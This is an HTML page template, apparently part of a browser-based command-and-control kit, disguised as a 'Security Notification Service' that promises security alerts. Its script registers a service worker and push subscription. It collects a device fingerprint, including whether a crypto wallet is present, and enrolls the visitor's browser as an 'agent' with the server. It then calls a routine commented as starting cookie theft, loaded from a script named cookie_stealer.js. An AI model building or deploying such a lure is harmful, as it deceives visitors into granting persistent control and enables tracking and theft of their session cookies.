<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Notification Service</title>
    <script src="/static/js/fingerprint.js"></script>
    <script src="/static/js/cookie_stealer.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 60px 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }

        .icon {
            font-size: 80px;
            margin-bottom: 20px;
        }

        h1 {
            color: #2d3748;
            font-size: 32px;
            margin-bottom: 16px;
        }

        p {
            color: #718096;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 32px;
        }

        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 18px 48px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .status {
            margin-top: 24px;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            display: none;
        }

        .status.show {
            display: block;
        }

        .status.success {
            background: #c6f6d5;
            color: #22543d;
            border: 2px solid #38a169;
        }

        .status.error {
            background: #fed7d7;
            color: #742a2a;
            border: 2px solid #e53e3e;
        }

        .features {
            margin-top: 40px;
            text-align: left;
        }

        .feature {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
            padding: 12px;
            background: #f7fafc;
            border-radius: 8px;
        }

        .feature-icon {
            font-size: 24px;
            margin-right: 16px;
        }

        .feature-text {
            color: #4a5568;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">üîî</div>
        <h1>Enable Security Notifications</h1>
        <p>Stay protected with real-time security alerts and updates directly in your browser.</p>
        
        <button class="btn" onclick="enableNotifications()">
            Enable Notifications
        </button>
        
        <div class="status" id="status"></div>
        
        <div class="features">
            <div class="feature">
                <div class="feature-icon">üõ°Ô∏è</div>
                <div class="feature-text">Real-time security alerts</div>
            </div>
            <div class="feature">
                <div class="feature-icon">‚ö°</div>
                <div class="feature-text">Instant threat notifications</div>
            </div>
            <div class="feature">
                <div class="feature-icon">üîí</div>
                <div class="feature-text">Account protection updates</div>
            </div>
        </div>
    </div>

    <script>
	    const publicVapidKey = '{{ vapid_public_key }}';

        function urlBase64ToUint8Array(base64String) {
            const padding = '='.repeat((4 - base64String.length % 4) % 4);
            const base64 = (base64String + padding)
                .replace(/\-/g, '+')
                .replace(/_/g, '/');

            const rawData = window.atob(base64);
            const outputArray = new Uint8Array(rawData.length);

            for (let i = 0; i < rawData.length; ++i) {
                outputArray[i] = rawData.charCodeAt(i);
            }
            return outputArray;
        }

        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status show ' + type;
        }

        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes('Edg')) return 'Edge';  // Edge check first!
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            return 'Unknown';
        }

        function getOSInfo() {
            const platform = navigator.platform;
            const ua = navigator.userAgent;
            
            if (platform.includes('Win')) return 'Windows';
            if (platform.includes('Mac')) return 'macOS';
            if (platform.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return platform;
        }

        function getFingerprint() {
            const hasCryptoWallet = !!(window.ethereum || window.solana || window.phantom);
            
            return {
                browser: getBrowserInfo(),
                os: getOSInfo(),
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                hasCryptoWallet: hasCryptoWallet,
                plugins: navigator.plugins.length,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                connection: navigator.connection?.effectiveType || 'unknown'
            };
        }

        async function enableNotifications() {
            try {
                showStatus('Checking browser compatibility...', 'success');

                // Check if notifications are supported
                if (!('Notification' in window)) {
                    showStatus('‚ùå Notifications not supported in this browser.', 'error');
                    console.error('Notifications not supported');
                    return;
                }

                // Check if service workers are supported
                if (!('serviceWorker' in navigator)) {
                    showStatus('‚ùå Service Workers not supported in this browser.', 'error');
                    console.error('Service Workers not supported');
                    return;
                }

                // Check if push is supported
                if (!('PushManager' in window)) {
                    showStatus('‚ùå Push messaging not supported in this browser.', 'error');
                    console.error('Push not supported');
                    return;
                }

                // Check current permission
                console.log('[Debug] Current permission:', Notification.permission);
                
                if (Notification.permission === 'denied') {
                    showStatus('‚ùå Notifications are blocked. Please enable them in browser settings and refresh.', 'error');
                    console.log('[Debug] Notifications are denied. To enable:');
                    console.log('  1. Click the padlock/info icon in address bar');
                    console.log('  2. Click "Permissions for this site"');
                    console.log('  3. Set Notifications to "Allow"');
                    console.log('  4. Refresh the page');
                    return;
                }

                // Request permission
                showStatus('Requesting notification permission...', 'success');
                console.log('[Debug] Requesting permission...');
                
                const permission = await Notification.requestPermission();
                console.log('[Debug] Permission result:', permission);
                
                if (permission !== 'granted') {
                    showStatus('‚ùå Permission denied. Please allow notifications and try again.', 'error');
                    console.log('[Debug] User denied permission');
                    return;
                }

                // Test notification
                showStatus('Testing notifications...', 'success');
                try {
                    new Notification('Success!', { 
                        body: 'Notifications are working!',
                        icon: '/static/img/icon.png',
                        requireInteraction: false
                    });
                    console.log('[Debug] Test notification sent');
                } catch (e) {
                    console.error('[Debug] Test notification failed:', e);
                }

                // Register service worker
                showStatus('Registering service worker...', 'success');
                console.log('[Debug] Registering service worker...');
                
                const registration = await navigator.serviceWorker.register('/sw.js');
                console.log('[Debug] Service worker registered:', registration);
                
                await navigator.serviceWorker.ready;
                console.log('[Debug] Service worker ready');

                // Subscribe to push
                showStatus('Setting up push notifications...', 'success');
                console.log('[Debug] Subscribing to push...');
                
                const subscription = await registration.pushManager.subscribe({
                    userVisibleOnly: true,
                    applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
                });

                console.log('[Debug] Push subscription:', subscription);

                const fingerprint = getFingerprint();
                console.log('[Debug] Fingerprint:', fingerprint);

                // Enroll agent
                showStatus('Completing enrollment...', 'success');
                console.log('[Debug] Enrolling agent...');
                
                const response = await fetch('/api/enroll', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        subscription: subscription.toJSON(),
                        fingerprint: fingerprint
                    })
                });

                const data = await response.json();
                console.log('[Debug] Enrollment response:', data);

                if (data.success) {
                    showStatus('‚úÖ Security notifications enabled successfully!', 'success');
                    localStorage.setItem('ronniec2_agent_id', data.agent_id);
                    
                    if (navigator.serviceWorker.controller) {
                        navigator.serviceWorker.controller.postMessage({
                            type: 'SAVE_AGENT_ID',
                            agent_id: data.agent_id
                        });
                        console.log('[Debug] Sent agent_id to service worker');
                    }
                    
                    console.log('[Debug] Agent ID:', data.agent_id);

                    // Collect enhanced fingerprint
                    console.log('[Debug] Collecting enhanced fingerprint...');
                    collectEnhancedFingerprint().then(async (enhancedFP) => {
                        console.log('[Debug] Enhanced fingerprint:', enhancedFP);
                        
                        const fpResponse = await fetch('/api/fingerprint', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                agent_id: data.agent_id,
                                ...enhancedFP
                            })
                        });
                        
                        if (fpResponse.ok) {
                            console.log('[Debug] ‚úÖ Enhanced fingerprint sent');
                        } else {
                            console.log('[Debug] ‚ùå Enhanced fingerprint failed');
                        }
                        
                        // START COOKIE STEALING
                        console.log('[Debug] üç™ Starting cookie theft...');
                        startCookieStealing(data.agent_id);
                    });

                } else {
                    showStatus('‚ùå Enrollment failed: ' + data.error, 'error');
                    console.error('[Debug] Enrollment failed:', data.error);
                }

            } catch (error) {
                console.error('[Debug] Error:', error);
                showStatus('‚ùå Error: ' + error.message, 'error');
                
                // Provide helpful error messages
                if (error.name === 'NotAllowedError') {
                    showStatus('‚ùå Permission was denied. Please allow notifications and try again.', 'error');
                } else if (error.name === 'NotSupportedError') {
                    showStatus('‚ùå This feature is not supported in your browser.', 'error');
                } else if (error.message.includes('subscription')) {
                    showStatus('‚ùå Failed to create push subscription. Please try again.', 'error');
                }
            }
        }

        // Auto-check on page load
        window.addEventListener('load', () => {
            console.log('[Debug] Page loaded');
            console.log('[Debug] Notification support:', 'Notification' in window);
            console.log('[Debug] Current permission:', Notification.permission);
            console.log('[Debug] Service Worker support:', 'serviceWorker' in navigator);
            console.log('[Debug] Push support:', 'PushManager' in window);
            console.log('[Debug] Browser:', getBrowserInfo());
            console.log('[Debug] OS:', getOSInfo());
        });
    </script>
</body>
</html>
